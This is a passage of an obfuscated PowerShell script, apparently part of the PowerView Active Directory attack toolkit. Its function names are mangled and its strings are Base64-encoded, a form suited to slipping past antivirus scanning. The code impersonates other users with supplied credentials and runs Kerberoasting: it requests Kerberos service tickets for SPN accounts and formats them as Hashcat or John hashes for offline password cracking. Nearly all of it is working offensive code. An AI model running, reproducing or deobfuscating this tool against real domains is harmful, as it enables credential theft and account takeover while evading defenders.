        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${_/=\/=====\/\_/==} in ${/=\/\/\/=\__/\_/=}) {
                ${_/=\/=====\/\_/==} = ${_/=\/=====\/\_/==}.Trim('\')
                ${___/=\__/\/===\/=} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBfAC8APQBcAC8APQA9AD0APQA9AFwALwBcAF8ALwA9AD0AfQBcAEkAUABDACQA')))
            }
        }
        else {
            ${___/=\__/\/===\/=} += ,$Path
        }
        ForEach (${/=\/=\_/\/===\/==} in ${___/=\__/\/===\/=}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAB1AG4AbQBvAHUAbgB0ADoAIAAkAHsALwA9AFwALwA9AFwAXwAvAFwALwA9AD0APQBcAC8APQA9AH0A')))
            ${___/=\/\________/} = ${/====\/\__/=\/=\/}::WNetCancelConnection2(${/=\/=\_/\/===\/==}, 0, $True)
            if (${___/=\/\________/} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQBcAF8ALwBcAC8APQA9AD0AXAAvAD0APQB9ACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAB1AG0AbQBvAHUAbgB0AGUAZAA=')))
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting ${/=\/=\_/\/===\/==} : $(([ComponentModel.Win32Exception]${___/=\/\________/}).Message)"
            }
        }
    }
}
function __/\__/\/==\/==\_/ {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${__/\__/\/\/\_/\/==},
        [Switch]
        ${__/\/=\/==\/=\/=\_}
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAZQB0AA==')))])) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAHUAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQBkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbwByAGsALgA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        ${/=\/\_/=\/\_/====} = ${__/\__/\/\/\_/\/==}
    }
    else {
        ${/=\/\_/=\/\_/====} = [IntPtr]::Zero
        ${__/======\/\/\/==} = $Credential.GetNetworkCredential()
        $UserDomain = ${__/======\/\/\/==}.Domain
        ${/=\__/\_/\__/\/\_} = ${__/======\/\/\/==}.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$(${/=\__/\_/\__/\/\_})"
        ${___/=\/\________/} = ${/=\____/===\/=\_/}::LogonUser(${/=\__/\_/\__/\/\_}, $UserDomain, ${__/======\/\/\/==}.Password, 9, 3, [ref]${/=\/\_/=\/\_/====});${__/\_/==\/===\__/} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not ${___/=\/\________/}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
        }
    }
    ${___/=\/\________/} = ${/=\____/===\/=\_/}::ImpersonateLoggedOnUser(${/=\/\_/=\/\_/====})
    if (-not ${___/=\/\________/}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')))
    ${/=\/\_/=\/\_/====}
}
function _/==\_/\/=\_/==\/\ {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${__/\__/\/\/\_/\/==}
    )
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdgBlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        ${___/=\/\________/} = ${_/\/=====\__/\__/}::CloseHandle(${__/\__/\/\/\_/\/==})
    }
    ${___/=\/\________/} = ${/=\____/===\/=\_/}::RevertToSelf();${__/\_/==\/===\__/} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not ${___/=\/\________/}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function _/==\/\/\/==\/=\/= {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${__/===\______/=\/\},
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object[]]
        ${_/==\/=\___/=====\},
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
            ${/=\__/=\___/\/=\/} = ${_/==\/=\___/=====\}
        }
        else {
            ${/=\__/=\___/\/=\/} = ${__/===\______/=\/\}
        }
        ForEach ($Object in ${/=\__/=\___/\/=\/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                ${_/\___/=\/\___/==} = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                ${/==\_/=\/\__/\_/=} = $Object.DistinguishedName
            }
            else {
                ${_/\___/=\/\___/==} = $Object
                $SamAccountName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                ${/==\_/=\/\__/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            }
            if (${_/\___/=\/\___/==} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${_/\___/=\/\___/==} = ${_/\___/=\/\___/==}[0]
            }
            try {
                ${/=\/=\_/\/\__/=\_} = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${_/\___/=\/\___/==}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0AF0AIABFAHIAcgBvAHIAIAByAGUAcQB1AGUAcwB0AGkAbgBnACAAdABpAGMAawBlAHQAIABmAG8AcgAgAFMAUABOACAAJwAkAHsAXwAvAFwAXwBfAF8ALwA9AFwALwBcAF8AXwBfAC8APQA9AH0AJwAgAGYAcgBvAG0AIAB1AHMAZQByACAAJwAkAHsALwA9AD0AXABfAC8APQBcAC8AXABfAF8ALwBcAF8ALwA9AH0AJwAgADoAIAAkAF8A')))
            }
            if (${/=\/=\_/\/\__/=\_}) {
                ${__/====\__/===\/=} = ${/=\/=\_/\/\__/=\_}.GetRequest()
            }
            if (${__/====\__/===\/=}) {
                ${/==\/===\__/\___/} = New-Object PSObject
                ${_/=\/=\___/\____/} = [System.BitConverter]::ToString(${__/====\__/===\/=}) -replace '-'
                ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
                ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${/==\_/=\/\__/\_/=}
                ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) ${/=\/=\_/\/\__/=\_}.ServicePrincipalName
                if(${_/=\/=\___/\____/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKAA/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALgAuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA+AC4AKwApAA==')))) {
                    ${_/\/\/=\/=\_/====} = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    ${/===\/\_/\/\/===\} = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    ${_/====\___/===\_/} = $Matches.DataToEnd.Substring(0,${/===\/\_/\/\/===\}*2)
                    if($Matches.DataToEnd.Substring(${/===\/\_/\/\/===\}*2, 4) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                        Write-Warning "Error parsing ciphertext for the SPN  $(${/=\/=\_/\/\__/=\_}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${/====\/\___/=\__/} = $null
                        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${__/====\__/===\/=}).Replace('-',''))
                    } else {
                        ${/====\/\___/=\__/} = "$(${_/====\___/===\_/}.Substring(0,32))`$$(${_/====\___/===\_/}.Substring(32))"
                        ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $(${/=\/=\_/\/\__/=\_}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${/====\/\___/=\__/} = $null
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${__/====\__/===\/=}).Replace('-',''))
                }
                if(${/====\/\___/=\__/}) {
                    if ($OutputFormat -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGgAbgA=')))) {
                        ${/=\/\__/=\_/==\__} = "`$krb5tgs`$$(${/=\/=\_/\/\__/=\_}.ServicePrincipalName):${/====\/\___/=\__/}"
                    }
                    else {
                        if (${/==\_/=\/\__/\_/=} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain = ${/==\_/=\/\__/\_/=}.SubString(${/==\_/=\/\__/\_/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                        }
                        ${/=\/\__/=\_/==\__} = "`$krb5tgs`$$(${_/\/\/=\/=\_/====})`$*$SamAccountName`$$UserDomain`$$(${/=\/=\_/\/\__/=\_}.ServicePrincipalName)*`$${/====\/\___/=\__/}"
                    }
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABhAHMAaAA='))) ${/=\/\__/=\_/==\__}
                }
                ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
                ${/==\/===\__/\___/}
            }
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Invoke-Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${____/\_____/\/===} = @{
            'SPN' = $True
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ____/\/====\/\___/ @____/\_____/\/=== | ? {$_.samaccountname -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | _/==\/\/\/==\/=\/= -OutputFormat $OutputFormat
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Get-PathAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function _/=\_/\/=\_/\_/=\_ {
            [CmdletBinding()]
            Param(
                [Int]
                ${_/=\____/\___/=\_/}
            )
            ${_/=====\/=\/\____} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${/\_______/======\} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${__/=\/\_/\/===\/\} = @()
            ${__/=\/\_/\/===\/\} += ${/\_______/======\}.Keys | % {
                              if ((${_/=\____/\___/=\_/} -band $_) -eq $_) {
                                ${/\_______/======\}[$_]
                                ${_/=\____/\___/=\_/} = ${_/=\____/\___/=\_/} -band (-not $_)
                              }
                            }
            ${__/=\/\_/\/===\/\} += ${_/=====\/=\/\____}.Keys | ? { ${_/=\____/\___/=\_/} -band $_ } | % { ${_/=====\/=\/\____}[$_] }
            (${__/=\/\_/\/===\/\} | ? {$_}) -join ','
        }
